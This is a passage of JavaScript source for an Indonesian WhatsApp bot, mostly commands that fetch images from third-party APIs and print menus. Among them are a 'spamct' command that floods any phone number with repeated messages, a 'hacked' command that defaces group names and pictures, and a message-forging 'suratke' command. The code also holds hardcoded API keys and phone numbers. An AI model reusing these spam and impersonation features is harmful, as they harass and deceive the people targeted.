                    babi = args.join(" ")
                    reply("wait")
                    buffer = await getBuffer(`https://hardianto-chan.herokuapp.com/api/photooxy/coffe-cup?apikey=hardianto&text=${babi}`)
                    syaa.sendMessage(from, buffer, image, {caption: 'Nih kak.. *Jangan lupa follow ig @𝕀𝕂𝕐', quoted: mek})
                break
case "attp":
  if (isBanned) return reply(mess.ban)
					if (args.length < 1) return reply('Teksnya?')
					biji = body.slice(6)
					atetepe = await getBuffer(`https://api.xteam.xyz/attp?file&text=${biji}`)
					syaa.sendMessage(from, atetepe, sticker, { quoted: mek })
					break
case "ttpyellow":
  if (isBanned) return reply(mess.ban)
					if (args.length < 1) return reply('Teksnya?')
					biji = body.slice(11)
					atetepe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/ttpcustom?text=${biji}&color=yellow&apikey=hardianto`)
					syaa.sendMessage(from, atetepe, sticker, { quoted: mek })
					break
case "ttpgreen":
  if (isBanned) return reply(mess.ban)
					if (args.length < 1) return reply('Teksnya?')
					biji = body.slice(10)
					atetepe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/ttpcustom?text=${biji}&color=green&apikey=hardianto`)
					syaa.sendMessage(from, atetepe, sticker, { quoted: mek })
					break
case "ttpblue":
  if (isBanned) return reply(mess.ban)
					if (args.length < 1) return reply('Teksnya?')
					biji = body.slice(9)
					atetepe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/ttpcustom?text=${biji}&color=blue&apikey=hardianto`)
					syaa.sendMessage(from, atetepe, sticker, { quoted: mek })
					break
case "ttp":
  if (isBanned) return reply(mess.ban)
					if (args.length < 1) return reply('Teksnya?')
					biji = body.slice(5)
					atetepe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/ttpcustom?text=${biji}&color=brown&apikey=hardianto`)
					syaa.sendMessage(from, atetepe, sticker, { quoted: mek })
					break
case "kiss":
  if (isBanned) return reply(mess.ban)
					atetepe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=kiss&apikey=hardianto`)
					syaa.sendMessage(from, atetepe, sticker, { quoted: mek })
					break
case "halloween":
  if (isBanned) return reply(mess.ban)
					if (args.length < 1) return reply('Teksnya?')
					biji = body.slice(11)
					atetepe = await getBuffer(`https://bx-hunter.herokuapp.com/api/flamingtext/spider?text=${biji}&apikey=Ikyy69`)
					syaa.sendMessage(from, atetepe, image, { quoted: mek })
					break
case "nartoh":
					if (args.length < 1) return reply('Teksnya?')
					biji = body.slice(8)
					atetepe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/photooxy/coffe-cup?apikey=hardianto&text=${biji}`)
					syaa.sendMessage(from, atetepe, image, { quoted: mek })
					break
case "minion":
  if (isBanned) return reply(mess.ban)
					if (args.length < 1) return reply('Teksnya?')
					biji = body.slice(8)
					atetepe = await getBuffer(`https://bx-hunter.herokuapp.com/api/flamingtext/minions?text=${biji}&apikey=Ikyy69`)
					syaa.sendMessage(from, atetepe, image, { quoted: mek })
					break
case "hentai":
  if (isBanned) return reply(mess.ban)
  if (!isPremium) return reply(mess.prem)
  reply(mess.wait)
					atetepe = await getBuffer(`https://bx-hunter.herokuapp.com/api/nsfw/hentai?apikey=Ikyy69`)
					syaa.sendMessage(from, atetepe, image, { quoted: mek })
					break
case "blowjob":
  if (isBanned) return reply(mess.ban)
  reply(mess.wait)
					atetepe = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=blowJob&apikey=hardianto`)
					syaa.sendMessage(from, atetepe, image, { quoted: mek })
					break
case "ssweb":
  if (isBanned) return reply(mess.ban)
  reply(mess.wait)
       ini_url = body.slice(7)
					atetepe = await getBuffer(`https://bx-hunter.herokuapp.com/api/ssweb?url=${ini_url}&apikey=Ikyy69`)
					syaa.sendMessage(from, atetepe, image, { quoted: mek })
					break
case "artinama":
  reply(mess.wait)
  nama_lo = body.slice(10)
					atetepe = await getBuffer(`https://bx-hunter.herokuapp.com/api/artinama?nama=${nama_lo}&apikey=Ikyy69`)
					syaa.sendMessage(from, atetepe, { quoted: mek })
					break
case 'unblock':
					if (isBanned) return reply(mess.ban)
				    syaa.blockUser (`${body.slice(9)}@c.us`, "remove")
				 syaa.sendMessage(from, `*Perintah Diterima, Membuka Blockir* ${body.slice(9)}@c.us`, text)
					break
case "block":
  if (isBanned) return reply(mess.ban)
				 syaa.updatePresence(from, Presence.composing) 
				 syaa.chatRead (from)
					syaa.blockUser (`${body.slice(7)}@c.us`, "add")
					syaa.sendMessage(from, `*Perintah Diterima, Memblokir* ${body.slice(7)}@c.us`, text)
					break
case "shutdown":
					if (!isOwner && !mek.key.fromMe) return reply(mess.own) 
				return syaa.sendMessage(from, JSON.stringify(eval(process.exit())))
				reply('Byee Byeee')
				break
case "hacked":
  if (!isOwner && !mek.key.fromMe) return reply(mess.own) 
              if (!isGroup) return reply(mess.only.group)
              if (args.length < 1) return reply('Teksnya?')
              reply('Otw Hack')
                tessgc = await getBuffer(`https://i.ibb.co/m4Qx3JG/20210319-204838.jpg`)
                   syaa.updateProfilePicture (from, tessgc)
                   await sleep(1000)
                syaa.groupUpdateSubject(from, `HACKED BY ${body.slice(7)}`)
                await sleep(1000)
                syaa.groupUpdateDescription(from, `_${pushname} telah meretas grup ini_`)             
                await sleep(1000)
                syaa.sendMessage(from, 'Succes Hacked', text, {quoted: mek})
					break
case 'detikvn':
  if (isBanned) return reply(mess.ban)
encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediam = await syaa.downloadAndSaveMediaMessage(encmediam)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(mediam)
						syaa.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:mek})
						fs.unlinkSync(mediam)
				break
				case 'detikvideo':
				  if (isBanned) return reply(mess.ban)
				encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					median = await syaa.downloadAndSaveMediaMessage(encmedian)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(median)
						syaa.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: mek})
						fs.unlinkSync(median)
				break
case "bahasa"://FIXED BY ARASYAA!!!!
case "kodebahasa"://FIXED BY ARASYAA!!!!
case "code"://FIXED BY ARASYAA!!!!
if (isBanned) return reply(mess.ban)
  reply(`*List Kode Bahasa Untuk Fitur tts id*

  af: Afrikaans,
  sq: Albanian,
  ar: Arabic,
  hy: Armenian,
  ca: Catalan,
  zh: Chinese,
  zh-cn: Chinese (Mandarin/China),
  zh-tw: Chinese (Mandarin/Taiwan),
  zh-yue: Chinese (Cantonese),
  hr: Croatian,
  cs: Czech,
  da: Danish,
  nl: Dutch,
  en: English,
  en-au: English (Australia),
  en-uk: English (United Kingdom),
  en-us: English (United States),
  eo: Esperanto,
  fi: Finnish,
  fr: French,
  de: German,
  el: Greek,
  ht: Haitian Creole,
  hi: Hindi,
  hu: Hungarian,
  is: Icelandic,
  id: Indonesian,
  it: Italian,
  ja: Japanese,
  ko: Korean,
  la: Latin,
  lv: Latvian,
  mk: Macedonian,
  no: Norwegian,
  pl: Polish,
  pt: Portuguese,
  pt-br: Portuguese (Brazil),
  ro: Romanian,
  ru: Russian,
  sr: Serbian,
  sk: Slovak,
  es: Spanish,
  es-es: Spanish (Spain),
  es-us: Spanish (United States),
  sw: Swahili,
  sv: Swedish,
  ta: Tamil,
  th: Thai,
  tr: Turkish,
  vi: Vietnamese,
  cy: Welsh
  
  Ketik /tts _Kode Bahasa_ _Text_
  contoh /tts id Arasya Ganteng`)
  break
case 'tts'://FIXED BY ARASYAA!!!!
if (isBanned) return reply(mess.ban)
					if (args.length < 1) return syaa.sendMessage(from, `Kode bahasanya mana kak? contoh : ${prefix}tts id yamate kudasai`, text, { quoted: mek })
				   const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return syaa.sendMessage(from, `Teksnya mana kak? contoh : ${prefix}tts id yamate kudasai`, text, { quoted: mek })
					var bby = body.slice(8)
					ranm = getRandom('.mp3')
					rano = getRandom('.ogg')
					bby.length > 300
						? reply('Teks nya terlalu panjang kak')
						: gtts.save(ranm, bby, function () {
							exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
								fs.unlinkSync(ranm)
								buff = fs.readFileSync(rano)
								if (err) return reply(dla.stikga())
								syaa.sendMessage(from, buff, audio, { duration: 359996400, ptt: true, quoted: mek })
								fs.unlinkSync(rano)
							})
						})
					break
					
case 'infogempa':
  if (isBanned) return reply(mess.ban)
					anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/info/gempa?apikey=Ikyy69`, {method: 'get'})

					gempa = `❏ *INFO GEMPA*\n\n❏ Waktu : ${anu.result.Waktu}\n❏ Lintang : ${anu.result.Lintang}\n❏ Bujur : ${anu.result.Bujur}\n❏ Magnitudo : ${anu.result.Magnitudo}\n❏ Kedalaman : ${anu.result.Kedalaman}\n❏ Wilayah : ${anu.result.Wilayah}`
					reply('Sabar sayang')
					buff = await getBuffer(anu.result.Map)
					syaa.sendMessage(from, buff, image, {quoted: mek, caption: gempa})
					case 'creategroup':
			case 'creategrup':
			  if (isBanned) return reply(mess.ban)
			if (!isGroup) return reply(mess.only.group)
				if (args.length < 1) return reply(`Penggunaan ${prefix}creategrup nama grup|@tag member`)
				argz = arg.split('|')
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++){
						anu = []
						anu.push(mentioned[i])
                    }
					syaa.groupCreate(argz[0], anu)
					reply(`Sukses membuat grup ${arg[0]}`)
                }
				break
case 'dadu':
  if (isBanned) return reply(mess.ban)
			random = Math.floor(Math.random() * 6) + 1
		damdu = fs.readFileSync(`./sticker/${random}.webp`)
			syaa.sendMessage(from, damdu, sticker, {quoted: mek})
			break

case "infofilm": // Update NEW FITUR 
if (isBanned) return reply(mess.ban)
reply(`wait loading`)
                if (args.length < 1) return reply(`mau nyari apaan bwang di joox?`)
                reply(`[❕] Loading`)
                asu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/filmapik/search?film=${body.slice(10)}&apikey=beta`)
                teks = '=================\n'
                resa = asu.result.result
                for (let i of resa) {
                    teks += `*Title* : ${i.title}\n*Rating* : ${i.rating}\n*Episode* : ${i.episode}\n*Movie ID* : ${i.movieId}\n*Views* : ${i.views}\n*Duration* : ${i.duration}\n*Release* : ${i.release}\n=================\n`
                }
                reply(teks)
                break
case 'donat':
              reply(`◪ *DONASI*
  │
  ├─ ❏ *GOPAY*
  ├─ ❏ 088213292687
  ├─ ❏ *OVO*
  ├─ ❏ 088213292687
  ├─ ❏ *PULSA*
  ├─ ❏ 081319944917
  ├─ ❏ *INSTAGRAM*
  └─ ❏ https://www.instagram.com/@𝕀𝕂𝕐`)

              break
case 'suratke': // Case Oleh Rafli
if (isBanned) return reply(mess.ban)
                if (!isOwner && !mek.key.fromMe) return reply(mess.own)    
				const textp = body.slice(8)
				const noorg2 = textp.split("|")[0]
				const katakita2 = textp.split("|")[1]
				const kataorg2 = `Surat Dari ${sender}`
				try {
				pping = await syaa.getProfilePicture(`${sender.split('@')[0]}@c.us`)
				} catch {
				pping = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				const mnik = `
╔════ ◤ *SURAT FITUR* ◢
║╔▸
║╠ *From* : ${pushname}
║╠ *Number* : @${sender.split("@")[0]}
║╠ *For* : You
║╚▸
║╔▸   ﹝ *ISI SURAT* ﹞  
║╠ ${katakita2}
║╚▸
╚═══ ◤ *BY MINFORMASI* ◢ `
				syaa.sendMessage(`${noorg2}@s.whatsapp.net`,pping, image , {caption: mnik, quoted: { key: {fromMe:false, participant:`${noorg2}@s.whatsapp.net`},message: { conversation: `${kataorg2}`, contextInfo: {"mentionedJid": [sender]}}}});	
				reply('Surat Sukses Dikirim')
				break
case "spamct":
              if (isBanned) return reply(mess.ban)
              if (args.length == 0) return reply(`Masukkan Parameter\n\ncommand : ${prefix}spamchat nomor|jumlah|teks`)
					spatek = args.join(' ').split('|')
					if (isNaN(spatek[0])) return reply('Nomor Harus Berupa Angka!')
					for (let i = 0; i < spatek[1]; i++) {
					syaa.sendMessage(spatek[0]+'@s.whatsapp.net', `${spatek[2]}`, text)
					}
					reply(`Spam Terkirim Ke nomor ${spatek[0]}`)
					break
case "truth":
  if (isBanned) return reply(mess.ban)
					// Fix Case By Yogi/Hans⛔
                 
					const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?']
					const ttrth = trut[Math.floor(Math.random() * trut.length)]
					truteh = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
					sendButImage(from, ttrth, "Case By @iamghosky_\nmau lagi? tekan tombol di bawah", thumb, [
          {

            buttonId: `${prefix}truth`,
            buttonText: {
              displayText: `Truth😆`,
            },
            type: 1,
          },

 ]);
					
					break
		case "dare":
		  if (isBanned) return reply(mess.ban)
					// Fix Case By Yogi/Hans⛔
                 
					const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "🦄💨" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
					const der = dare[Math.floor(Math.random() * dare.length)]
					sya = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
					sendButImage(from, der, "Case By @iamghosky_\nmau lagi? tekan tombol di bawah", thumb, [
          {
            buttonId: `${prefix}dare`,
            buttonText: {
              displayText: `Dare😆`,
            },
            type: 1,
          },

 ]);
					break
case "donasi":
  case "donate":
					// Fix Case by syaa
					sya = await getBuffer(`${linkimg}`)
					syaa.sendMessage(from, sya, image, { quoted: mek, caption: `◪ *DONASI*
  ║
  ├─ ❏ *GOPAY*
  ├─ ❏ ${gopay}
  ├─ ❏ *OVO*
  ├─ ❏ ${ovo}
  ├─ ❏ *DANA*
  ├─ ❏ ${dana}
  ├─ ❏ *PULSA*
  ├─ ❏ ${pulsa}
  ├─ ❏ *INSTAGRAM*
  └─ ❏ https://www.instagram.com/${instagram}` })
					break
case "info":
    me = syaa.user
					uptime = process.uptime()
					// Fix Case by syaa
					sya = await getBuffer(`https://telegra.ph/file/2dbc5ba5b587d02c9ff3d.jpg`)
					syaa.sendMessage(from, sya, image, { quoted: mek, caption: `*INFO OWNER*\n*Owner bot* : Arasya\n*No Owner* : wa.me/6283102774416\n*Ig owner* : www.instagram.com/${instagram}\n━━━━━━━━━━━━━━━━━━━━\n*INFO BOT*\n*Nama bot* : ${me.name}\n*Nomor bot* : @${me.jid.split('@')[0]}\n*Prefix* : ${prefix}\n*Total block contact* : ${blocked.length}\n*The bot is active on* : ${kyun(uptime)}\n*Ketik* : ${prefix}report _Untuk melaporkan admin bot melalui bot_\n*Ketik* : ${prefix}owner untuk menghubungi admin bot kami.` })
					break
//MENU² AN
case "ownermenu":
					// Fix Case by syaa
					sya = await getBuffer(`https://telegra.ph/file/0f2a2ecf9500e502fe58a.png`)
					syaa.sendMessage(from, sya, image, { quoted: mek, caption: `*OWNER MENU*
[]• ${prefix}off
[]• ${prefix}on
[]• ${prefix}status
[]• ${prefix}setthumb
[]• ${prefix}settarget
[]• ${prefix}shutdown
[]• ${prefix}hacked
[]• ${prefix}setfakeimg
[]• ${prefix}setreply
[]• ${prefix}addprem @user
[]• ${prefix}dellprem @user
[]• ${prefix}ban @user
[]• ${prefix}unban @user
[]• ${prefix}setprefix [2 Button]
[]• ${prefix}mode [2 Button self/public]
[]• ${prefix}term <code>
[]• ${prefix}eval <code>
[]• ${prefix}colongsw [reply sw]
[]• ${prefix}readall
[] $
[] >
[] =>` })
					break
case "grupmenu":
  case "groupmenu":
					// Fix Case by syaa
					sya = await getBuffer(`https://telegra.ph/file/24149d6200dbd9e55942d.png`)
					syaa.sendMessage(from, sya, image, { quoted: mek, caption: `*GRUP MENU*					
║• ${prefix}grup [3 Button]
║• ${prefix}promote <reply chat member>
║• ${prefix}demote <reply chat member>
║• ${prefix}setdesc
║• ${prefix}setname
║• ${prefix}hidetag
║• ${prefix}kontag
║• ${prefix}sticktag
║• ${prefix}totag
║• ${prefix}kick <reply/tag member>
║• ${prefix}add <reply/tag member>
║• ${prefix}getbio <reply chat member>
║• ${prefix}getname <reply chat member>
║• ${prefix}reminder <msg/2s>
║• ${prefix}listonline
║• ${prefix}groupinfo
║• ${prefix}linkgc
║• ${prefix}sider [reply chat bot]
║• ${prefix}antilink
║• ${prefix}antihidetag
║• ${prefix}antiviewonce
║• ${prefix}antivirtex
║• ${prefix}kickarea` })
					break
case "makermenu":
					// Fix Case by syaa
					sya = await getBuffer(`https://telegra.ph/file/ce0ff72c46a2d6b45e24a.png`)
					syaa.sendMessage(from, sya, image, { quoted: mek, caption: `*MAKER MENU*					
║• ${prefix}memegen Atas|Bawah
║• ${prefix}bajingan lu _Nama Mu_
║• ${prefix}sticker
║• ${prefix}attp _Text_
║• ${prefix}swm <author|packname>
║• ${prefix}take <author|packname>
║• ${prefix}fdeface
║• ${prefix}semoji
║• ${prefix}wasted
║• ${prefix}wanted
║• ${prefix}pubglogo teks|teks
║• ${prefix}deltrash
║• ${prefix}card-game Judul|Keterangan
║• ${prefix}squidrip
║• ${prefix}sertiff1 <text>
║• ${prefix}bpink <text>
║• ${prefix}tulis
║• ${prefix}googlem Text|Text
║• ${prefix}roses
║• ${prefix}wooden
║• ${prefix}quote
║• ${prefix}textburn
║• ${prefix}tahta _Nama_
║• ${prefix}halloween _Name_
║• ${prefix}matrixlogo
║• ${prefix}matrix
║• ${prefix}pornhub
║• ${prefix}neon
║• ${prefix}herobanner
║• ${prefix}silverplahbutton
║• ${prefix}goldplaybutton
║• ${prefix}epeplogo
║• ${prefix}lolim
║• ${prefix}remm
║• ${prefix}gura
║• ${prefix}kaneki _Name_` })
					break
case "funmenu":
					// Fix Case by syaa
					sya = await getBuffer(`https://telegra.ph/file/f5dd2eb768a133d3b6528.png`)
					syaa.sendMessage(from, sya, image, { quoted: mek, caption: `*FUN MENU*					
║• ${prefix}slot
║• ${prefix}suit
║• ${prefix}say _Text_
║• ${prefix}bisakah _Querry_
║• ${prefix}kapankah _Querry_
║• ${prefix}apakah _Querry_
║• ${prefix}belah _Querry_
║• ${prefix}bagaimanakah _Querry_
║• ${prefix}rate _Querry_
║• ${prefix}caklontong
║• ${prefix}sangecek _Name_
║• ${prefix}gaycek _Name_
║• ${prefix}terganteng
║• ${prefix}tercantik
║• ${prefix}lesbicek _Name_
║• ${prefix}gantengcek _Name_
║• ${prefix}cantikcek _Name_
║• ${prefix}watak _Name_
║• ${prefix}hobby _Name_
║• ${prefix}fitnah
║• ${prefix}fitnahpc
║• ${prefix}kontak 62831027744168|iky
║• ${prefix}jadian
║• ${prefix}
║• ${prefix}tod
║• ${prefix}truth
║• ${prefix}dare
║• ${prefix}wangy _NamaMu_
║• ${prefix}citacita` })
					break
case "convertmenu":
					// Fix Case by syaa
					sya = await getBuffer(`https://telegra.ph/file/88c94984d46ab3784a759.png`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*CONVERT*					
║• ${prefix}toimg
║• ${prefix}tomp3
║• ${prefix}tomp4
║• ${prefix}slow
║• ${prefix}fast
║• ${prefix}reverse
║• ${prefix}tourl` })
					break
case "downloadmenu":
					// Fix Case by syaa
					sya = await getBuffer(`https://telegra.ph/file/88c94984d46ab3784a759.png`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*DOWNLOADER MENU*				
║• ${prefix}youtube <url>
║• ${prefix}ytmp3 <url>
║• ${prefix}ytmp4 <url>
║• ${prefix}tiktok <url>
║• ${prefix}instagram <url>
║• ${prefix}twitter <url>` })
					break
case "uploadmenu":
					// Fix Case by syaa
					sya = await getBuffer(`https://telegra.ph/file/88c94984d46ab3784a759.png`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*UP STORY MENU*
║• ${prefix}upswteks
║• ${prefix}upswimage
║• ${prefix}upswvideo
║• ${prefix}upswvoice
║• ${prefix}upswgif
║• ${prefix}upswaudio
║• ${prefix}upswsticker` })
					break
case "storagemenu":
					// Fix Case by syaa
					sya = await getBuffer(`https://telegra.ph/file/88c94984d46ab3784a759.png`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*STORAGE MENU*
║• ${prefix}addvn _Nama_
║• ${prefix}addvideo _Nama_
║• ${prefix}addsticker _Nama_
║• ${prefix}addimage _Nama_
║• ${prefix}listvn
║• ${prefix}listvideo
║• ${prefix}liststicker
║• ${prefix}listimg
║• ${prefix}getvn _Database_
║• ${prefix}getvideo _Database_
║• ${prefix}getsticker _Database_
║• ${prefix}getimage _Database_` })
					break
case "menulain":
					// Fix Case by syaa
					sya = await getBuffer(`https://telegra.ph/file/88c94984d46ab3784a759.png`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*OTHER MENU*
║• ${prefix}asupan
║• ${prefix}asupan2
║• ${prefix}tts id _Text_
║• ${prefix}polosanmeme
║• ${prefix}detikvn <ReplyVn|Jumlah>
║• ${prefix}detikvideo <ReplyVid|Jumlah>
║• ${prefix}delete
║• ${prefix}infogempa
║• ${prefix}dadu
║• ${prefix}tospam _Jumlah_
║• ${prefix}ping
║• ${prefix}inspect
║• ${prefix}join
║• ${prefix}caripesan <query>
║• ${prefix}get
║• ${prefix}ytsearch <query>
║• ${prefix}igstalk <query>
║• ${prefix}githubstalk <query>
║• ${prefix}tiktokstalk <query>
║• ${prefix}play <query>
║• ${prefix}video <query>
║• ${prefix}igstory <username>
║• ${prefix}twitter <link>
║• ${prefix}tiktok <link>
║• ${prefix}tiktokaudio <link>
║• ${prefix}fb <link>
║• ${prefix}brainly <query>
║• ${prefix}image <query>
║• ${prefix}anime <random>
║• ${prefix}pinterest <query>
║• ${prefix}komiku <query>
║• ${prefix}lirik <query>
║• ${prefix}chara <query>
║• ${prefix}playstore <query>
║• ${prefix}otaku <query>` })
					break
case "stcmd":
					// Fix Case by syaa
					sya = await getBuffer(`https://telegra.ph/file/381f48dc7fcdd20f78edd.png`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*STICKER CMD*
║• ${prefix}addcmd
║• ${prefix}delcmd
║• ${prefix}listcmd` })
					break
case "imagemenu":
					// Fix Case by syaa
					sya = await getBuffer(`https://telegra.ph/file/9a9d57dfe3aed1c9df709.jpg`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*RANDOM IMAGE*
║• ${prefix}cecan
║• ${prefix}cogan
║• ${prefix}quotes
║• ${prefix}quotesindo
║• ${prefix}hewan
║• ${prefix}kucing
║• ${prefix}squidward
║• ${prefix}spongebob
║• ${prefix}patrick
║• ${prefix}minato
║• ${prefix}kakashi
║• ${prefix}boruto
║• ${prefix}sarada
║• ${prefix}mitsuki
║• ${prefix}sasuke
║• ${prefix}sakura
║• ${prefix}itachi
║• ${prefix}megumin
║• ${prefix}loli
║• ${prefix}husbu
║• ${prefix}wafiu
║• ${prefix}wallpaperanime
║• ${prefix}naruto
║• ${prefix}aeshtetic` })
					break

case "smenu":
					// Fix Case by syaa
					sya = await getBuffer(`https://telegra.ph/file/9a9d57dfe3aed1c9df709.jpg`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*SOUND*
║• ${prefix}s1
║• ${prefix}s2
║• ${prefix}s3
║• ${prefix}s4
║• ${prefix}s5
║• ${prefix}s6
║• ${prefix}s7
║• ${prefix}s8
║• ${prefix}s9
║• ${prefix}s8
║• ${prefix}s9
║• ${prefix}s10
║• ${prefix}s11
║• ${prefix}s12
║• ${prefix}s13
║• ${prefix}s14
║• ${prefix}s15
║• ${prefix}s16
║• ${prefix}s17
║• ${prefix}s18
║• ${prefix}s19
║• ${prefix}s20
║• ${prefix}s21
║• ${prefix}s22
║• ${prefix}s23
║• ${prefix}s24
║• ${prefix}s25
║• ${prefix}s26
║• ${prefix}s27
║• ${prefix}s28
║• ${prefix}s29
║• ${prefix}s30
║• ${prefix}s30` })
					break
					case 'epeplogo':
                     if (args.length == 0) return reply(`Teks Mana Om? Contoh ${prefix + command} Iky Gans ?`)
	                text_pak = `${body.slice(10)}`
	                reply(mess.wait)
	                buffer = await getBuffer (`https://api.zeks.xyz/api/epep?apikey=${zeksapi}&text=${text_pak}`)
	                syaa.sendMessage(from, buffer, image, { quoted: mek, caption:'𝐍𝐢𝐡 𝐊𝐚𝐤 𝐃𝐚𝐡 𝐉𝐚𝐝𝐢\iky gansss?',  contextInfo: { forwardingScore: 1000, isForwarded: true}})
	                await limitAdd(sender)
	                break

                case 'goldplaybutton':
                     if (args.length == 0) return reply(`Teks Mana Om? Contoh ${prefix + command} Iky Gans ?`)
	                text_pak = `${body.slice(16)}`
	                reply(mess.wait)
	                buffer = await getBuffer (`https://api.zeks.xyz/api/gplaybutton?apikey=${zeksapi}&text=${text_pak}`)
	                syaa.sendMessage(from, buffer, image, { quoted: mek, caption:'𝐍𝐢𝐡 𝐊𝐚𝐤 𝐃𝐚𝐡 𝐉𝐚𝐝𝐢\iky gansss?', contextInfo: { forwardingScore: 1000, isForwarded: true}})
	                await limitAdd(sender)
	                break
	                               
                case 'silverplaybutton':
                     if (args.length == 0) return reply(`Teks Mana Om? Contoh ${prefix + command} Iky Gans ?`)
	                text_pak = `${body.slice(18)}`
	                reply(mess.wait)
	                buffer = await getBuffer (`https://api.zeks.xyz/api/splaybutton?apikey=${zeksapi}&text=${text_pak}`)
	                syaa.sendMessage(from, buffer, image, { quoted: mek, caption:'𝐍𝐢𝐡 𝐊𝐚𝐤 𝐃𝐚𝐡 𝐉𝐚𝐝𝐢\iky gansss?', contextInfo: { forwardingScore: 1000, isForwarded: true}})
	                await limitAdd(sender)
	                break

                case 'matrixlogo':
                     if (args.length == 0) return reply(`Teks Mana Om? Contoh ${prefix + command} Iky Gans ?`)
	                reply(mess.wait)
	                txt_pak = `${body.slice(12)}`
	                reply(mess.wait)
	                buffer = await getBuffer (`https://api.zeks.xyz/api/matrix?apikey=${zeksapi}&text=${txt_pak}`)
	                syaa.sendMessage(from, buffer, image, { quoted: mek, caption:'𝐍𝐢𝐡 𝐊𝐚𝐤 𝐃𝐚𝐡 𝐉𝐚𝐝𝐢\iky gansss?', contextInfo: { forwardingScore: 1000, isForwarded: true}})
	                await limitAdd(sender)
	                break

                case 'nulis':
                     if (args.length == 0) return reply(`Teks Mana Om? Contoh ${prefix + command} Iky Gans ?`)
	                pulpen = `${body.slice(7)}`
	                reply(mess.wait)
	                buffer = await getBuffer (`https://api.zeks.xyz/api/magernulis?apikey=${zeksapi}&nama=${pushname}&kelas=XII%20IPS%202&text=${pulpen}&tinta=10`)
	                syaa.sendMessage(from, buffer, image, { quoted: mek, caption:'𝐍𝐢𝐡 𝐊𝐚𝐤 𝐃𝐚𝐡 𝐉𝐚𝐝𝐢\iky gansss?', contextInfo: { forwardingScore: 1000, isForwarded: true}})
	                await limitAdd(sender)
	                break

                case 'tulisanpasir':
                     if (args.length == 0) return reply(`Teks Mana Om? Contoh ${prefix + command} Iky Gans ?`)
	                ini_txt = `${body.slice(14)}`
	                reply(mess.wait)
	                buffer = await getBuffer(`https://api.zeks.xyz/api/sandw?apikey=${zeksapi}&text=${ini_txt}`)
	                syaa.sendMessage(from, buffer, image, { quoted: mek, caption:'𝐍𝐢𝐡 𝐊𝐚𝐤 𝐃𝐚𝐡 𝐉𝐚𝐝𝐢\iky gansss?', contextInfo: { forwardingScore: 1000, isForwarded: true}})
	                await limitAdd(sender)
	                break					
        case 'czbmenu': 
 if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        sendButMessage(from, `🗿`, `Silahkan pilih salah satu🗿`, [
          {
